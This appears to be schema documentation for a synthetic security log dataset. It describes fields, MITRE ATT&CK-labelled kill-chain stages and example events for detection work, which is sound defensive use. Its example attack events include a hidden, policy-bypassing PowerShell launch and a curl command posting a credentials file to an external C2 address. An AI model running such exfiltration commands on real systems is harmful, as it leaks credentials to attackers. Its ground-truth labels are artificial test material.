ENTERPRISE SECURITY LOG DATASET - SCHEMA DOCUMENTATION

Version 1.0 | November 2025 | Dataset: ATK_63070

═══════════════════════════════════════════════════════════════════════════════

CORE FIELDS

Field                   Type      Required   Description
─────────────────────────────────────────────────────────────────────────────
timestamp               string    yes        ISO 8601: "2025-11-18 14:32:01"
user                    string    yes        Human identity: "linda.davis381"
account                 string    yes        Security principal (user or svc_*)
service_account         string    yes        "true" or "false"
hostname                string    yes        Device: "WS-SEC-0159", "DC-01"
device_type             string    yes        workstation, domain_controller, etc
location                string    yes        NYC_HQ, SF_Office, London, Remote_VPN
department              string    cond       Security, Finance, Engineering, etc
role                    string    cond       "Security Analyst", "DBA", etc
task_category           string    cond       Activity type (see reference doc)
process_name            string    cond       "powershell.exe", "net.exe", etc
parent_process          string    cond       "cmd.exe", "explorer.exe", etc
command_line            string    cond       Full command with arguments
event_type              string    yes        process_start, network_connection, etc
source_ip               string    cond       "10.1.0.148"
destination_ip          string    cond       "10.1.52.52" or "203.0.113.70" (C2)
port                    string    cond       "135", "443", "3389", etc
protocol                string    cond       TCP, UDP, HTTPS, RDP, etc
session_id              string    cond       "linda.davis381_2025-11-18"

ATTACK LABELS (GROUND TRUTH)
attack_id               string    yes        "ATK_63070" or null
attack_type             string    yes        "t1059.001" or null (MITRE technique)
stage_number            string    yes        "0" through "15" or null

═══════════════════════════════════════════════════════════════════════════════

EVENT TYPES

process_start, process_end, file_access, file_create, file_delete, file_modify,
network_connection, admin_action, privilege_escalation, login_success, 
login_failure, logout, registry_access, scheduled_task, service_start,
database_query, web_browsing, email_access, usb_access, print_event, system_event

═══════════════════════════════════════════════════════════════════════════════

MITRE ATT&CK TECHNIQUE REFERENCE

t1059.001 - Command and Scripting Interpreter: PowerShell
  Tactic: Execution
  Used in: Stages 0-3 (initial access, malicious script execution)
  https://attack.mitre.org/techniques/T1059/001/

t1087.002 - Account Discovery: Domain Account
  Tactic: Discovery
  Used in: Stages 4-6 (domain admin enumeration, AD reconnaissance)
  https://attack.mitre.org/techniques/T1087/002/

t1021.001 - Remote Services: Remote Desktop Protocol
  Tactic: Lateral Movement
  Used in: Stages 7-10 (RDP to domain controllers)
  https://attack.mitre.org/techniques/T1021/001/

t1041 - Exfiltration Over C2 Channel
  Tactic: Exfiltration
  Used in: Stages 11-15 (multi-channel data exfiltration)
  https://attack.mitre.org/techniques/T1041/

═══════════════════════════════════════════════════════════════════════════════

ATTACK LABELS

Benign events: All attack fields are null
Attack events: All attack fields populated

ATK_63070 Kill Chain:
  Stage 0-3:   t1059.001 (PowerShell execution)
  Stage 4-6:   t1087.002 (Domain Account Discovery)
  Stage 7-10:  t1021.001 (RDP Lateral Movement)
  Stage 11-15: t1041 (Exfiltration Over C2)

Account Progression:
  Stages 0-1: account = "linda.davis381" (user context)
  Stages 2+:  account = "svc_adconnect" (service account compromise)

═══════════════════════════════════════════════════════════════════════════════

EXAMPLES

Benign User Event:
{
  "timestamp": "2025-11-18 09:15:23",
  "user": "charles.smith389",
  "account": "charles.smith389",
  "service_account": "false",
  "hostname": "WS-FIN-0042",
  "device_type": "workstation",
  "location": "NYC_HQ",
  "department": "Finance",
  "process_name": "excel.exe",
  "event_type": "process_start",
  "attack_id": null,
  "attack_type": null,
  "stage_number": null
}

Service Account Background Activity:
{
  "timestamp": "2025-11-18 02:30:15",
  "user": "NA",
  "account": "svc_backup",
  "service_account": "true",
  "hostname": "BACKUP-SRV-01",
  "device_type": "backup_server",
  "process_name": "robocopy.exe",
  "parent_process": "services.exe",
  "event_type": "file_create",
  "attack_id": null,
  "attack_type": null,
  "stage_number": null
}

Attack Event (Stage 0 - Initial Access):
{
  "timestamp": "2025-11-18 14:32:01",
  "user": "linda.davis381",
  "account": "linda.davis381",
  "service_account": "false",
  "hostname": "WS-SEC-0159",
  "device_type": "workstation",
  "location": "NYC_HQ",
  "department": "Security",
  "process_name": "powershell.exe",
  "parent_process": "cmd.exe",
  "command_line": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden",
  "event_type": "process_start",
  "source_ip": "10.1.0.148",
  "destination_ip": "10.1.52.52",
  "port": "135",
  "protocol": "TCP",
  "attack_id": "ATK_63070",
  "attack_type": "t1059.001",
  "stage_number": "0"
}

Attack Event (Stage 13 - Exfiltration):
{
  "timestamp": "2025-11-22 22:15:33",
  "user": "linda.davis381",
  "account": "svc_adconnect",
  "service_account": "true",
  "hostname": "WS-SEC-0159",
  "process_name": "curl.exe",
  "command_line": "curl -X POST -F file=@C:\\temp\\credentials.txt http://203.0.113.70:9090/data",
  "event_type": "network_connection",
  "destination_ip": "203.0.113.70",
  "port": "9090",
  "protocol": "HTTP",
  "attack_id": "ATK_63070",
  "attack_type": "t1041",
  "stage_number": "13"
}

═══════════════════════════════════════════════════════════════════════════════

KEY NOTES

String Formatting:
- Booleans are strings: "true"/"false" not true/false
- Stage numbers are strings: "0" not 0
- All null values are JSON null

Network Patterns:
- Internal: 10.x.x.x, 192.168.x.x
- External C2: 203.0.113.70 (ports 8080, 443, 9090)

Common Service Accounts:
- svc_adconnect (AD sync, compromised in ATK_63070)
- svc_backup, svc_monitoring, svc_database, svc_siem_collector

Departments:
- Security, Engineering, Finance, Sales, HR, Legal, Operations, Support, IT

Locations:
- NYC_HQ (10.1.0.0/16)
- SF_Office (10.2.0.0/16)
- London (10.3.0.0/16)
- Remote_VPN (192.168.0.0/16)
